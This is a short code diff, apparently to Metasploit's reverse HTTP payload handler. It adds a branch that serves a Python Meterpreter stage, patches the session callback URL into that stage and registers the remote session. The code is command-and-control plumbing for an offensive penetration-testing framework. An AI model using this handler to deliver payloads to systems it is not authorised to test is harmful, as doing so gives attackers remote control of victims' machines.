@@ -194,6 +194,27 @@ protected
 
     # Process the requested resource.
     case uri_match
+      when /^\/INITPY/
+        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
+        url = payload_uri + conn_id + '/'
+
+        blob = ""
+        blob << obj.generate_stage
+
+        # Patch the conn_id
+        blob = blob.sub("CONNECTION_URL = None", "CONNECTION_URL = '#{url}'")
+
+        resp.body = blob
+
+        # Short-circuit the payload's handle_connection processing for create_session
+        create_session(cli, {
+          :passive_dispatcher => obj.service,
+          :conn_id            => conn_id,
+          :url                => url,
+          :expiration         => datastore['SessionExpirationTimeout'].to_i,
+          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+          :ssl                => ssl?,
+        })
       when /^\/INITJM/
         conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
         url = payload_uri + conn_id + "/\x00"
@@ -223,7 +244,6 @@ protected
         })
 
       when /^\/A?INITM?/
-
         url = ''
 
         print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{req.relative_resource} received...")
